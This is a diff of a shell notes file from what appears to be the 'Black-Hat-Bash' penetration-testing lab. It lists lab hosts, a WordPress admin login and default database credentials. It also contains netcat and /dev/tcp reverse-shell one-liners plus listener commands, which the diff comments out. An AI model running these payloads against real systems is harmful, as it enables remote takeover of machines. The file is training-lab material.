@@ -26,10 +26,11 @@ source "/home/kali/Projects/Black-Hat-Bash/SETUP/pentest.sh"
 # 172.16.10.12/donate.php
 #   pwncat-cs -l -p 1337
 #   | bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
+#
 # 10.1.0.13 (c-backup - corporate network)
 #   PORT 8095 - listen from p-web-02 (172.16.10.12/10.1.0.11)
 #   PORT 8096 - listen from p-jumpbox-01 (172.16.10.13/10.1.0.12)
-#   execute.sh was updated from p-web-01 () to establish reverse shell to p-web-02 (which has both public & corporate network access)
+#   execute.sh was updated from p-web-01 to establish reverse shell to p-web-02 (which has both public & corporate network access)
 # 10.1.0.16 (MariaDB + WordPress Admin Page)
 #   username = root, password = root
 #   username = jane, password = bash, login url = http://172.16.10.12/wp-admin
@@ -44,11 +45,11 @@ source "/home/kali/Projects/Black-Hat-Bash/SETUP/pentest.sh"
 
 
 # Set up listener
-nc -lvp 1111
-pwncat-cs -l -p 1111
-
-# Run payload
-nohup nc 172.16.10.1 1111 -e /bin/bash &
-bash -c 'bash -i >& /dev/tcp/172.16.10.1/1111 0>&1'
+#nc -lvp 1111
+#pwncat-cs -l -p 1111
+#
+## Run payload
+#nohup nc 172.16.10.1 1111 -e /bin/bash &
+#bash -c 'bash -i >& /dev/tcp/172.16.10.1/1111 0>&1'
 
 # Playground
